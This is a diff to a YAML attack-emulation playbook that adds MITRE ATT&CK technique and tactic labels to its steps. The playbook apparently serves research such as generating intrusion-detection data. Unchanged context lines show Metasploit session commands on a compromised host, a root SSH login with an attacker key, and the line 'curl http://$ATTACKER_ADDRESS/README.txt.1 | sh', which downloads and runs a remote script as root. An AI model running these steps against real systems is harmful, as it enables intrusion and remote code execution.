@@ -130,6 +130,9 @@ commands:
     read: True
     cmd: id
     session: "foothold"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     cmd: vim /usr/share/awffull/awffull
@@ -208,10 +211,16 @@ commands:
   - type: msf-session
     cmd: id
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: msf-session
     session: "root"
     cmd: "curl http://$ATTACKER_ADDRESS/README.txt.1 | sh"
+    metadata:
+      techniques: "T1105"
+      tactics: "Command and Control"
 
   - type: sleep
     seconds: 40
@@ -220,6 +229,9 @@ commands:
     cmd: id
     read: True
     session: "root"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
 
 # TODO: THIS COMMAND DOES NOT WORK
@@ -254,6 +266,9 @@ commands:
     username: root
     key_filename: "/home/aecid/.ssh/attacker_key"
     creates_session: "rootshell"
+    metadata:
+      techniques: "T1033"
+      tactics: "Discovery"
 
   - type: ssh
     cmd: pwd
